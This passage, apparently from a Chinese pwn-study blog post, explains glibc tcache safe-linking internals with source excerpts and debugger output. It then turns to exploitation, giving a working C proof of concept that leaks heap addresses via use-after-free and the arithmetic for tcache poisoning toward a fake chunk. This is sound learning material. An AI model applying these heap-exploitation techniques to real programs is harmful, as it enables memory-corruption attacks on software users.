class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint16_t</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">    tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure>
<p><code>key</code>不再是<code>tcache</code>基地址,而是一个随机数</p>
<p><code>next</code>不再是明文的下一个堆块地址,加了密了,盖了帽了</p>
<h4 id="algorithm-2">algorithm</h4>
<h5 id="key-init">key init</h5>
<p>在<code>malloc.c</code>中有一个静态变量<code>tcache_key</code>,
每一个被放到<code>tcahce</code>中的堆块,
都会拷贝之作为自己的<code>key</code></p>
<p>与<code>glibc-2.31</code>上直接使用<code>tcache</code>地址作为<code>key</code>不同</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">uintptr_t</span> tcache_key;</span><br></pre></td></tr></table></figure>
<p>这个值会在第一次调用<code>malloc</code>时, 在整个堆初始化之前,
率先初始化,
包括<code>fopen</code>等操作间接调用的<code>malloc</code></p>
<p>整个初始化过程是这样的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">malloc</span> @ <span class="built_in">malloc</span>/<span class="built_in">malloc</span>.c</span><br><span class="line">	ptmalloc_init @ <span class="built_in">malloc</span>/arena.c</span><br><span class="line">		tcache_key_initialize</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_key_initialize</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (__getrandom_nocancel(&amp;tcache_key, <span class="keyword">sizeof</span>(tcache_key), GRND_NONBLOCK) != <span class="keyword">sizeof</span>(tcache_key))</span><br><span class="line">    &#123;</span><br><span class="line">        tcache_key = random_bits();</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> __WORDSIZE == 64</span></span><br><span class="line">        tcache_key = (tcache_key &lt;&lt; <span class="number">32</span>) | random_bits();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>给一个随机数作为<code>tcache_key</code>,
此后本进程执行期间不再更换<code>tcache_key</code>,
所有加入<code>tcache</code>的堆块都要拷贝该<code>key</code>值</p>
<h5 id="malloc-2">malloc</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">malloc =&gt; __libc_malloc</span><br><span class="line">	=&gt; tcache_get</span><br></pre></td></tr></table></figure>
<p><code>malloc</code>和之前的版本无太大区别</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//@ __libc_malloc</span></span><br><span class="line"><span class="type">size_t</span> tc_idx = csize2tidx(tbytes);		<span class="comment">//桶子下标</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins &amp;&amp; tcache != <span class="literal">NULL</span> &amp;&amp; tcache-&gt;counts[tc_idx] &gt; <span class="number">0</span>)</span><br><span class="line">&#123;	</span><br><span class="line">    victim = tcache_get(tc_idx);</span><br><span class="line">    <span class="keyword">return</span> tag_new_usable(victim);	<span class="comment">//作用不大</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span><span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> tcache_get_n(tc_idx, &amp;tcache-&gt;entries[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get_n</span><span class="params">(<span class="type">size_t</span> tc_idx, tcache_entry **ep)</span></span><br><span class="line">&#123;</span><br><span class="line">    tcache_entry *e;</span><br><span class="line">    <span class="keyword">if</span> (ep == &amp;(tcache-&gt;entries[tc_idx]))</span><br><span class="line">        e = *ep;			<span class="comment">//正常tcache调用的tcache_get_n走此分支</span></span><br><span class="line">    <span class="keyword">else</span>				</span><br><span class="line">        e = REVEAL_PTR(*ep);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely(!aligned_OK(e)))</span><br><span class="line">        malloc_printerr(<span class="string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);</span><br><span class="line">		<span class="comment">//#define aligned_OK(m)  (((unsigned long)(m) &amp; MALLOC_ALIGN_MASK) == 0) 要求堆块基地址低三位全为0,注意是低三位位位</span></span><br><span class="line">    <span class="keyword">if</span> (ep == &amp;(tcache-&gt;entries[tc_idx]))		</span><br><span class="line">        *ep = REVEAL_PTR(e-&gt;next);			<span class="comment">//异或解码next指针, 正常tcache调用的tcache_get_n走此分支</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        *ep = PROTECT_PTR(ep, REVEAL_PTR(e-&gt;next));</span><br><span class="line"></span><br><span class="line">    --(tcache-&gt;counts[tc_idx]);		<span class="comment">//更新计数器</span></span><br><span class="line">    e-&gt;key = <span class="number">0</span>;						<span class="comment">//防止泄露key</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="type">void</span> *)e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这个<code>tcache_get_n</code>看上去十分诡异</p>
<p>在<code>tcache_get_n(tc_idx, &amp;tcache-&gt;entries[tc_idx]);</code>传参已经很明确了,为啥还要再判断一下呢?</p>
<p>这是因为再另一个函数<code>_mid_memalign</code>中会直接调用<code>tcache_get_n</code>并且这里获取的堆块不一定是桶子头,因此要根据拿走的堆块是头块还是后来块进行区分</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">tcache_entry **tep = &amp; tcache-&gt;entries[tc_idx];</span><br><span class="line">tcache_entry *te = *tep;</span><br><span class="line"><span class="keyword">while</span> (te != <span class="literal">NULL</span> &amp;&amp; !PTR_IS_ALIGNED (te, alignment))</span><br><span class="line">  &#123;</span><br><span class="line">    tep = &amp; (te-&gt;next);</span><br><span class="line">    te = tcache_next (te);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">if</span> (te != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">void</span> *victim = tcache_get_n (tc_idx, tep);</span><br><span class="line">    <span class="keyword">return</span> tag_new_usable (victim);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>为什么会有头块和其他块的区别呢?</p>
<p>以为在<code>free</code>时,
<code>tcache-&gt;entries[tc_idx]</code>桶子头指针不会被加密,
但是堆块的next指针会被加密</p>
<p>因此拿头块出来,不需要对
<code>tcache-&gt;entries[tc_idx]</code>指针解密</p>
<p>但是从中间扣一块出来需要解密</p>
</blockquote>
<p>简单来说<code>tcache_get_n</code>干了这三个事</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ep =  &amp;tcache-&gt;entries[tc_idx]</span><br><span class="line">e = *ep</span><br><span class="line"> *ep = REVEAL_PTR(e-&gt;next);</span><br></pre></td></tr></table></figure>
<p><code>ep</code>就是桶子头,</p>
<p><code>e</code>是头上挂着的第一个节点,
由于桶子头到第一个堆块的指针不加密, 因此可以直接解引用拿到头块</p>
<p>接下来要把次块作为新头块链接到桶子头上</p>
<p>但是头块到次块的指针是有加密的,
因此需要先<code>REVEAL_PTR(e-&gt;next);</code>解密
,然后桶子头<code>ep</code>重新指向新头</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241010195555838.png"
alt="image-20241010195555838" />
<figcaption aria-hidden="true">image-20241010195555838</figcaption>
</figure>
<p><code>*ep = REVEAL_PTR(e-&gt;next);</code>具体如何解密呢</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br><span class="line"> *ep 	= REVEAL_PTR(e-&gt;next);</span><br><span class="line">    	= PROTECT_PTR (&amp;e-&gt;next, e-&gt;next)</span><br><span class="line">    	= ( (&amp;e-&gt;next) &gt;&gt;<span class="number">12</span> ) ^ (e-&gt;next)</span><br><span class="line">    	= ( this &gt;&gt; <span class="number">12</span> ) ^ ( next )</span><br></pre></td></tr></table></figure>
<p>就是当前堆块(数据区)地址右移<code>12</code>位然后和<code>next</code>块(数据区)地址做异或</p>
<h5 id="free-2">free</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">free =&gt; __libc_free</span><br><span class="line">	=&gt; _int_free</span><br><span class="line">		=&gt; tcache_put</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//@ _int_free</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> tc_idx = csize2tidx(size);</span><br><span class="line">    <span class="keyword">if</span> (tcache != <span class="literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Check to see if it&#x27;s already in the tcache.  */</span></span><br><span class="line">        tcache_entry *e = (tcache_entry *)chunk2mem(p);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* This test succeeds on double free.  However, we don&#x27;t 100%</span></span><br><span class="line"><span class="comment">           trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="comment">           2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely</span></span><br><span class="line"><span class="comment">           coincidence before aborting.  */</span></span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely(e-&gt;key == tcache_key)) <span class="comment">// 防止double free</span></span><br><span class="line">        &#123;</span><br><span class="line">            tcache_entry *tmp;</span><br><span class="line">            <span class="type">size_t</span> cnt = <span class="number">0</span>;</span><br><span class="line">            LIBC_PROBE(memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">            <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line">                 tmp;</span><br><span class="line">                 tmp = REVEAL_PTR(tmp-&gt;next), ++cnt) <span class="comment">// next指针不再直接指向下一个堆块, 有异或加密</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (cnt &gt;= mp_.tcache_count)</span><br><span class="line">                    malloc_printerr(<span class="string">&quot;free(): too many chunks detected in tcache&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (__glibc_unlikely(!aligned_OK(tmp)))</span><br><span class="line">                    malloc_printerr(<span class="string">&quot;free(): unaligned chunk detected in tcache 2&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (tmp == e)</span><br><span class="line">                    malloc_printerr(<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line">                <span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">                   few cycles, but don&#x27;t abort.  */</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) <span class="comment">// tc_idx对应桶子中还有剩余堆块</span></span><br><span class="line">        &#123;</span><br><span class="line">            tcache_put(p, tc_idx);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span><span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    tcache_entry *e = (tcache_entry *)chunk2mem(chunk);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">       detect a double free.  */</span></span><br><span class="line">    e-&gt;key = tcache_key;		<span class="comment">//给一个key</span></span><br><span class="line"></span><br><span class="line">    e-&gt;next = PROTECT_PTR(&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);	<span class="comment">//next加密</span></span><br><span class="line">    tcache-&gt;entries[tc_idx] = e;		<span class="comment">//头插法 ,注意这个指针是没有加密的</span></span><br><span class="line">    ++(tcache-&gt;counts[tc_idx]);			<span class="comment">//经验+1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里<code>next</code>如何计算的呢?</p>
<p>对于第一个入桶的堆块,此时<code>tcache-&gt;entries[tc_idx] = 0</code>,</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;e-&gt;next</span><br><span class="line">$<span class="number">7</span> = (<span class="keyword">struct</span> tcache_entry **) <span class="number">0x4052a0</span></span><br><span class="line">pwndbg&gt; p tcache-&gt;entries[tc_idx]</span><br><span class="line">$<span class="number">8</span> = (tcache_entry *) <span class="number">0x0</span></span><br><span class="line">pwndbg&gt; p e-&gt;next</span><br><span class="line">$<span class="number">9</span> = (<span class="keyword">struct</span> tcache_entry *) <span class="number">0x405</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">e-&gt;next = PROTECT_PTR(&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">e-&gt;next = ( 0x4052a0 &gt;&gt; 12 ) ^ 0</span><br><span class="line">		=0x405</span><br></pre></td></tr></table></figure>
<p>对于第二个入桶的堆块,此时<code>tcache-&gt;entries[tc_idx] = 0x4052a0</code>,
是最后一个进入该桶的堆块指针, 这个指针是没有加密的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;e-&gt;next</span><br><span class="line">$<span class="number">11</span> = (<span class="keyword">struct</span> tcache_entry **) <span class="number">0x4052c0</span></span><br><span class="line">pwndbg&gt; p  tcache-&gt;entries[tc_idx]</span><br><span class="line">$<span class="number">12</span> = (tcache_entry *) <span class="number">0x4052a0</span></span><br><span class="line">pwndbg&gt; p e-&gt;next</span><br><span class="line">$<span class="number">13</span> = (<span class="keyword">struct</span> tcache_entry *) <span class="number">0x4056a5</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">e-&gt;next = PROTECT_PTR(&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">e-&gt;next = ( 0x4052c0 &gt;&gt; 12 ) ^ 0x4052a0</span><br><span class="line">		= 0x405 ^ 0x4052a0</span><br><span class="line">		= 0x4056a5</span><br></pre></td></tr></table></figure>
<h4 id="exploit-1">exploit</h4>
<h5 id="safe-linking-uaf">[safe-linking] UAF</h5>
<p>假设我们有<code>UAF</code>的能力,如果想要泄露一个堆块的地址,还需要什么信息?</p>
<blockquote>
<p>“我们有<code>UAF</code>的能力”,说的更直白一些,就是在堆块释放回到<code>tcache</code>之后,可以打印泄露其<code>next</code>字段的值</p>
</blockquote>
<p>假设<code>tcache</code>为空,chunk1,chunk2,chunk3大小相同</p>
<p><strong>现在<code>free(chunk1)</code>释放回<code>tcache</code></strong></p>
<p><code>free</code> 前有</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcache.entries[idx] = 0</span><br></pre></td></tr></table></figure>
<p><code>free</code>后有</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chunk1.next = ( &amp;chunk1.next &gt;&gt; 12 ) ^ 0 =  chunk1_mem &gt;&gt; 12</span><br><span class="line">tcache.entries[idx]	-&gt; chunk1_mem</span><br></pre></td></tr></table></figure>
<p>即使我们有<code>chunk1</code>的<code>UAF</code>,也只能知道</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk1.next = chunk1_mem &gt;&gt; 12</span><br></pre></td></tr></table></figure>
<p>右移计算不可逆,低位数据已经丢失</p>
<p>我们能做的只能是利用<code>UAF</code>获取<code>chunk1.next</code>,也就是获取<code>chunk1</code>所在的虚拟页框号</p>
<p><strong>接着<code>free(chunk2)</code></strong></p>
<p><code>free</code>前有</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcache.entries[idx] = chunk1_mem</span><br></pre></td></tr></table></figure>
<p><code>free</code> 后有</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chunk2.next = ( &amp;chunk2.next &gt;&gt; 12 ) ^ (tcache.entries[idx])</span><br><span class="line">			= ( chunk2_mem &gt;&gt; 12 ) ^ (chunk1_mem)</span><br><span class="line">			</span><br><span class="line">tcache.entries[idx] = chunk2_mem		</span><br></pre></td></tr></table></figure>
<p>又<code>chunk1</code>和<code>chunk2</code>距离比较近,在同一页上,因此两者的虚拟页框号相同,也即</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk1_mem &gt;&gt; 12 == chunk2_mem &gt;&gt; 12</span><br></pre></td></tr></table></figure>
<p>那么有</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chunk2.next = (chunk1_mem &gt;&gt; 12) ^ (chunk1_mem)</span><br><span class="line">			= (chunk1.next) ^ (chunk1_mem)</span><br></pre></td></tr></table></figure>
<p>又异或运算可逆,因此有</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk1_mem = (chunk2.next) ^ (chunk1.next)</span><br></pre></td></tr></table></figure>
<p><strong>同理,如果继续<code>free(chunk3)</code></strong></p>
<p>可以得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk2_mem = (chunk3.next) ^ (chunk1.next)</span><br></pre></td></tr></table></figure>
<p>写个<code>poc</code>意思意思</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="type">size_t</span> * chunk1;</span><br><span class="line">  <span class="type">size_t</span> * chunk2;  </span><br><span class="line">  <span class="type">size_t</span> * chunk3;</span><br><span class="line">  <span class="type">size_t</span> chunk1_next;</span><br><span class="line">  <span class="type">size_t</span> chunk2_next;</span><br><span class="line">  <span class="type">size_t</span> chunk3_next;</span><br><span class="line"></span><br><span class="line">  chunk1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">  chunk2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">  chunk3 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">  <span class="built_in">free</span>(chunk1);   <span class="comment">// tcache.entries[idx] ==raw==&gt; [chunk1]</span></span><br><span class="line">  <span class="built_in">free</span>(chunk2);   <span class="comment">// tcache.entries[idx] ==raw==&gt; [chunk2] ====PROTECTED_PTR====&gt; [chunk1]</span></span><br><span class="line"></span><br><span class="line">  chunk1_next = chunk1[<span class="number">0</span>];</span><br><span class="line">  chunk2_next = chunk2[<span class="number">0</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;chunk1 @ %p\n&quot;</span>,chunk1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;chunk1_next ^ chunk2_next = %p\n&quot;</span>,chunk1_next ^ chunk2_next);</span><br><span class="line">  assert(chunk1_next ^ chunk2_next == chunk1);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(chunk3);   <span class="comment">// tcache.entries[idx] ==raw==&gt; [chunk3] ====PROTECTED_PTR====&gt; [chunk2] ====PROTECTED_PTR====&gt; [chunk1]</span></span><br><span class="line">  chunk3_next = chunk3[<span class="number">0</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;chunk2 @ %p\n&quot;</span>,chunk2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;chunk1_next ^ chunk3_next = %p\n&quot;</span>,chunk1_next ^ chunk3_next);</span><br><span class="line">  assert(chunk1_next ^ chunk3_next == chunk2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:/mnt/c/Users/<span class="number">86135</span>/Desktop/pwncollege/software/heap/test<span class="meta"># gcc safe.c -o safe -g -w</span></span><br><span class="line">root@Executor:/mnt/c/Users/<span class="number">86135</span>/Desktop/pwncollege/software/heap/test# ./safe</span><br><span class="line">chunk1 @ <span class="number">0x55fc111882a0</span></span><br><span class="line">chunk1_next ^ chunk2_next = <span class="number">0x55fc111882a0</span></span><br><span class="line">chunk2 @ <span class="number">0x55fc111882c0</span></span><br><span class="line">chunk1_next ^ chunk3_next = <span class="number">0x55fc111882c0</span></span><br></pre></td></tr></table></figure>
<h5 id="safe-linking-tcache-entry-poisoning">[safe-linking] tcache entry
poisoning</h5>
<p>如果还想象往日一样,往一个被释放进入<code>tcache</code>的堆块上挂不干净的东西<code>fake_chunk</code></p>
<p>首先为了满足<code>tcache.counts[idx]</code>的约束,需要堆里至少有两块,</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tcache.counts[idx] = 2</span><br><span class="line">tcache.entries[idx] =&gt; chunk2 -&gt; chunk1</span><br></pre></td></tr></table></figure>
<p>接下来考虑修改<code>chunk2.next</code>
指向<code>fake_chunk</code></p>
<p>修改完之后<code>tcache</code>的状态如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tcache.counts[idx] = 2</span><br><span class="line">tcache.entries[idx] =&gt; chunk2 -&gt; fake_chunk</span><br></pre></td></tr></table></figure>
<p>这种状态<strong>可以看作</strong><code>tcache</code>从<strong>空</strong>到先<code>free(fake_chunk)</code>然后<code>free(chunk2)</code>之后的状态,诚如是,可以从头开始考虑:</p>
<p>在<code>free(fake_chunk)</code>之后,<code>tcache</code>中的状态如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tcache.counts[idx] = 1</span><br><span class="line">tcache.entries[idx] =&gt; fake_chunk</span><br></pre></td></tr></table></figure>
<p>此时<code>free(chunk2)</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chunk2.next = ( &amp;chunk2.next &gt;&gt; 12 ) ^ (tcache.entries[idx])</span><br><span class="line">			= ( chunk2_mem &gt;&gt; 12 ) ^ (fake_chunk_mem)</span><br></pre></td></tr></table></figure>
<p>又<code>chunk2_mem &gt;&gt; 12</code>就是<code>chunk2</code>的虚拟页框号,其值等于<code>chunk1.next</code>,因此可以在<code>fake_chunk</code>上链前,先计算得知该值</p>
<p>又<code>fake_chunk_mem</code>是我们已知的目标地址,</p>
<p>因此<code>chunk2.next</code>计算可得</p>
<p>写个<code>poc</code>意思意思</p>
